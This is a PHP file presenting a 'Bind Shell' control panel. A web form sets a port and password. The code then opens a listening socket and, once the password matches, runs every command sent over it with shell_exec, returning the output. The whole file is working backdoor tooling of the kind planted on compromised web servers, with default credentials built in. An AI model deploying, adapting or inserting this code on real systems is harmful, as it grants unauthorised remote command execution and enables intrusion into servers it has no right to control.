<?php

/*********************

@@author : lionaneesh
@@facebook : facebook.com/lionaneesh
@@Email : lionaneesh@gmail.com

********************/

?>

<html>
<head>
    <title>Bind Shell -- PHP</title>
</head>

<body>

<h1>Welcome to Bind Shell Control Panel </h1>

<p> Fill in the form Below to Start the Bind Shell Service </p>

<?php
if( isset($_GET['port']) &&
    isset($_GET['passwd']) && 
    $_GET['port'] != "" &&
    $_GET['passwd'] != "" 
    )
    {
        $address = '127.0.0.1'; // As its a bind shell it will always host on the local machine
        
        // Set the ip and port we will listen on
        
        $port = $_GET['port'];
        $pass = $_GET['passwd'];
        // Set time limit to indefinite execution
        set_time_limit (0);

        if(function_exists("socket_create"))
        {
        // Create a TCP Stream socket
        $sockfd = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

      
        // Bind the socket to an address/port
        
        
        if(socket_bind($sockfd, $address, $port) == FALSE)
        {
            echo "Cant Bind to the specified port and address!";
        }
        // Start listening for connections
        socket_listen($sockfd,15);
        
    
        $passwordPrompt = 
"\n=================================================================\n
PHP Bind Shell\n
\n
@@author : lionaneesh\n
@@facebook : facebook.com/lionaneesh\n
@@Email : lionaneesh@gmail.com\n
\n
=================================================================\n\n

Please Enter Password : ";
        
        /* Accept incoming requests and handle them as child processes */
        $client = socket_accept($sockfd);
        

        socket_write($client , $passwordPrompt);
        
        // Read the pass from the client
        
        $input = socket_read($client, strlen($pass) + 2); // +2 for \r\n
        if(trim($input) == $pass)
        {
            socket_write($client , "\n\n");
            socket_write($client , shell_exec("date /t & time /t")  . "\n" . shell_exec("ver") . shell_exec("date") . "\n" . shell_exec("uname -a"));
            socket_write($client , "\n\n");
            while(1)
            {
                // Print Command prompt
                $commandPrompt ="(Bind-Shell)[$]> ";
                $maxCmdLen = 31337;
                socket_write($client,$commandPrompt);
                $cmd = socket_read($client,$maxCmdLen);
                if($cmd == FALSE)
                {
                    echo "The client Closed the conection!";
                    break;
                }
                socket_write($client , shell_exec($cmd));
            }
        }
        else
        {
            echo "Wrong Password!";
            socket_write($client, "Wrong Password , Please try again \n\n");
        }
        socket_shutdown($client, 2);
        socket_close($socket);
        }
        else
        {
            echo "Socket Conections not Allowed/Supported by the server! <br />";
        }
    }
    else
    {
    ?>
    <table align="center" >
         <form method="GET">
         <td>
            <table style="border-spacing: 6px;">
                <tr>
                    <td>Port</td>
                    <td>
                        <input style="width: 200px;" name="port" value="31337" />
                    </td>
                </tr>
                <tr>
                    <td>Passwd </td>
                    <td><input style="width: 100px;" name="passwd" size='5' value="lionaneesh"/>
                </tr>
                <tr>
                <td>
                <input style="width: 90px;" class="own" type="submit" value="Bind :D!"/>
                </td>
                </tr>    
                   
            </table>
         </td>
         </form>
    </tr>
    </table>
    <p align="center" style="color: red;" >Note : After clicking Submit button , The browser will start loading continuously , Dont close this window , Unless you are done!</p>
<?php
    }
?>